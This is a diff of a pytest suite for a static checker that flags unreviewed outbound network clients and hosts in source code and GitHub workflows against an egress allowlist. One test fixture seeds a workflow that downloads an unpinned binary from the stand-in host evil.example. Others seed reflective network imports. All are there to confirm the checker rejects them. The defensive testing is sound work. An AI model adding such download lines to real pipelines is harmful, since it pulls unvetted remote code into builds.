@@ -1,5 +1,7 @@
 """Bounded source contract, not a live egress test or an overlay firewall audit."""
 from pathlib import Path
+import ast
+import hashlib
 from collections import Counter
 import importlib.util
 import json
@@ -100,10 +102,12 @@ def test_network_smoke_runs_for_merge_groups_and_weekly():
 
 @pytest.fixture
 def contract_tree(tmp_path):
-    for name in ("src", "services", "deploy", "scripts", "config"):
+    for name in ("src", "services", "deploy", "scripts", "config", ".github"):
+        # fixture-write: Copy repository inputs into the synthetic contract tree.
         shutil.copytree(ROOT / name, tmp_path / name,
                         ignore=shutil.ignore_patterns("__pycache__", "*.egg-info"))
     for path in ROOT.glob("compose*.yaml"):
+        # fixture-write: Copy the reviewed Compose inputs into the synthetic tree.
         shutil.copy(path, tmp_path / path.name)
     return tmp_path
 
@@ -115,9 +119,68 @@ def run_contract(root):
                            "--root", str(root)], capture_output=True, text=True, timeout=45)
 
 
-def test_network_contract_current_tree():
-    result = run_contract(ROOT)
+def test_network_contract_current_tree(contract_tree):
+    result = run_contract(contract_tree)
     assert result.returncode == 0, result.stderr
+    rows = tomllib.loads((contract_tree / 'config/egress-allowlist.toml').read_text())['source']
+    assert {
+        ('scripts/corpus_recognition.py', 'network import'),
+        ('scripts/corpus_recognition.py', 'huggingface_hub.snapshot_download'),
+        ('scripts/corpus_recognition.py', 'faster_whisper.WhisperModel'),
+        ('scripts/stage-models.py', 'network import'),
+        ('scripts/stage-models.py', 'huggingface_hub.snapshot_download'),
+    } <= {(row['path'], row['detail']) for row in rows if row['kind'] == 'client'}
+    row = next(row for row in rows if row['kind'] == 'host' and
+               row['path'] == 'scripts/corpus_recognition.py')
+    path = contract_tree / row['path']
+    literal = next(node.value for node in ast.walk(ast.parse(path.read_text()))
+                   if isinstance(node, ast.Constant) and isinstance(node.value, str) and
+                   hashlib.sha256(node.value.encode()).hexdigest() == row['digest'])
+    # fixture-write: Duplicate one reviewed literal to test allowance multiplicity.
+    path.write_text(path.read_text() + f'\nDUPLICATE_HOST = {literal!r}\n')
+    result = run_contract(contract_tree)
+    assert result.returncode == 1
+    assert f"unreviewed outbound host: {row['detail']}" in result.stderr
+
+
+@pytest.mark.parametrize('command', ["python - <<'PY'", 'python3 - <<PY', 'python - <<"PY"'])
+def test_contract_reviews_workflow_python(contract_tree, command):
+    path = contract_tree / '.github/workflows/synthetic.yml'
+    # fixture-write: Create the synthetic workflow directory.
+    path.parent.mkdir(parents=True, exist_ok=True)
+    # fixture-write: Seed inline Python without executing its network call.
+    path.write_text('jobs:\n  probe:\n    steps:\n      - run: |\n          ' + command +
+                    "\n          import urllib.request\n"
+                    "          urllib.request.urlretrieve('https://evil.example/unpinned.bin', target)\n"
+                    '          PY\n')
+    result = run_contract(contract_tree)
+    assert result.returncode == 1
+    assert f'{path.relative_to(contract_tree)}:7: unreviewed outbound client: urllib.request.urlretrieve' in result.stderr
+
+
+@pytest.mark.parametrize('quote', ["'", '"'])
+def test_contract_reviews_workflow_python_command(contract_tree, quote):
+    path = contract_tree / '.github/workflows/synthetic.yaml'
+    # fixture-write: Create the synthetic workflow directory.
+    path.parent.mkdir(parents=True, exist_ok=True)
+    # fixture-write: Seed a simple quoted Python command for static inspection.
+    path.write_text('jobs:\n  probe:\n    steps:\n      - run: |\n'
+                    f'          python -c {quote}import urllib.request{quote}\n')
+    result = run_contract(contract_tree)
+    assert result.returncode == 1
+    assert f'{path.relative_to(contract_tree)}:5: unreviewed outbound client: network import' in result.stderr
+
+
+def test_contract_rejects_invalid_workflow_python(contract_tree):
+    path = contract_tree / '.github/workflows/synthetic.yml'
+    # fixture-write: Create the synthetic workflow directory.
+    path.parent.mkdir(parents=True, exist_ok=True)
+    # fixture-write: Seed an invalid inline Python source for rejection.
+    path.write_text("jobs:\n  probe:\n    steps:\n      - run: |\n          python - <<'PY'\n"
+                    '          invalid Python @\n          PY\n')
+    result = run_contract(contract_tree)
+    assert result.returncode == 1
+    assert f'{path.relative_to(contract_tree)}:6: invalid Python source' in result.stderr
 
 
 @pytest.mark.parametrize("value", [
@@ -219,7 +282,7 @@ def test_contract_rejects_private_and_split_hosts(contract_tree, source, host, l
     assert f"src/synthetic_probe.py:{line}: unreviewed outbound host: {host}" in result.stderr.splitlines()
 
 
-def test_contract_allowances_equal_findings_and_pruning_is_dead_only():
+def test_contract_allowances_equal_findings_and_pruning_is_dead_only(contract_tree):
     spec = importlib.util.spec_from_file_location("network_contract", ROOT / "scripts/network-contract.py")
     checker = importlib.util.module_from_spec(spec)
     spec.loader.exec_module(checker)
@@ -232,6 +295,14 @@ def test_contract_allowances_equal_findings_and_pruning_is_dead_only():
     assert findings == allowances
     for key in PRUNED_ALLOWANCES:
         assert key not in findings
+    assert checker.check(contract_tree) == []
+    policy_path = contract_tree / 'config/egress-allowlist.toml'
+    row = policy['source'][0]
+    # fixture-write: Add a surplus exact allowance without adding its source occurrence.
+    policy_path.write_text(policy_path.read_text() + '\n[[source]]\n' +
+                           ''.join(f'{key} = {json.dumps(value)}\n' for key, value in row.items()))
+    assert any('stale ' + row['kind'] + ' allowance: ' + row['detail'] in error
+               for error in checker.check(contract_tree))
 
 
 def test_network_contract_rejects_loosening(contract_tree):
@@ -336,6 +407,26 @@ def test_contract_rejects_alias_clients_and_invalid_source(contract_tree, source
     # fixture-write: Mutate the synthetic contract tree for boundary validation.
     (contract_tree / "src/synthetic_probe.py").write_text(source)
     assert run_contract(contract_tree).returncode == 1
+
+
+@pytest.mark.parametrize("source,expected", [
+    ('import importlib\nimportlib.import_module("huggingface_hub")\n',
+     [(2, "network import")]),
+    ('__import__("httpx")\n', [(1, "network import")]),
+    ('from importlib import import_module as load\ndef probe(destination):\n'
+     '    hub = load("httpx")\n    hub.get(destination)\n',
+     [(3, "network import"), (4, "httpx.get")]),
+], ids=["importlib", "builtin", "bound-alias"])
+def test_contract_rejects_reflective_network_imports(contract_tree, source, expected):
+    relative = "src/synthetic_probe.py"
+    # fixture-write: Seed literal reflective imports without executing network calls.
+    (contract_tree / relative).write_text(source)
+    result = run_contract(contract_tree)
+    assert result.returncode == 1
+    assert result.stderr.splitlines() == [
+        f"{relative}:{line}: unreviewed outbound client: {detail}"
+        for line, detail in expected
+    ]
 
 
 @pytest.mark.parametrize("module,member,arguments", [
